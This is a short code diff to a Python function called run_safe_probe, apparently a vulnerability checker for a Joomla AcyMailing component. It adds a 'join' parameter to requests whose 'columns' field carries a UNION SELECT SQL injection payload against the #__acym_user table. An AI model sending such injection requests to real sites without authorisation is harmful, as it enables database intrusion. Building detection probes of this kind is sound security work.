@@ -40,7 +40,7 @@ def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None)
     )
     attempts = []
     for endpoint in endpoints:
-        common = {"entity": "user", "offset": "0", "perCalls": "1"}
+        common = {"entity": "user", "offset": "0", "perCalls": "1", "join": ""}
         control_url = f"{endpoint}&{urllib.parse.urlencode({**common, 'columns': 'id'})}"
         payload = f"id FROM #__acym_user AS user UNION SELECT '{marker}'#"
         proof_url = f"{endpoint}&{urllib.parse.urlencode({**common, 'columns': payload})}"
